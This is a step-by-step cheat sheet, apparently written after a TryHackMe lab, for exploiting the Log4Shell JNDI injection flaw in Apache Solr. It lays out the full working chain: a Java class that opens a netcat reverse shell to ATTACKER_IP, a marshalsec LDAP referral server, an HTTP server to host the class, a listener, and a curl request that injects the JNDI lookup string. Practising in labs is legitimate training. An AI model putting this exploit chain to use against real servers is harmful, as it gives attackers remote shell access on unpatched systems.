This is a combination from the TryHackMe room and everyone else on Twitter
If you want to test this on your own, the room in TryHackMe is a great starting point:
	https://tryhackme.com/room/solar


[*] Bill of Materials

	WebServer
	LDAP Server
	NetCat (for this example, use what you want for your payload and listener)
	Malicious Java Class
	Some type of parameter input to leverage POST data


[*] Webserver
	WebServer Options - Asterisk for this example
		*python3 -m http.server
		php -S 0.0.0.0:8000
		Apache server
		nginx server


[*] Install Java on Ubuntu
	Have not tried newer versions, this is what is needed to get the LDAP server up and running
		sudo mkdir /usr/lib/jvm 
		cd /usr/lib/jvm
		sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed
		sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
		sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
		sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
		sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
		sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
		sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws

[*] Build your exploitable java class
	JAVA payload:


└─$ cat Exploit.java 
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash ATTACKER_IP 9001");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

	Alright compile it:
		javac Exploit.java
	Here you should see your Exploit.class, this will be called during exploitation


[*] LDAP Server
	https://github.com/mbechler/marshalsec
		git clone https://github.com/mbechler/marshalsec.git
	Maven
		sudo apt install maven
	Compile
		mvn clean package -DskipTests
	Run the Java server:
		java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTASCKER_IP:8000/#Exploit"


[*] Setup your netcat listener
	/bin/bash
	nc -lvnp 9001


[*] Malicious Payload
	TryHackMe example, will work on parameters you can POST to.
		curl 'http://VICTIM_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://ATTACKER_IP:1389/Exploit\}'
			keep in mind, "Exploit" is names "Exploit.class" on your python server
			"/#Exploit" in the LDAP server is correct. The syntax threw me off.


[*] Notes
	Once you send the payload (curl command), you will see the LDAP server redirect to your http server (python server above). The Python server should get a 200 OK on your Exploit.class. Your netcat listener should see a shell.
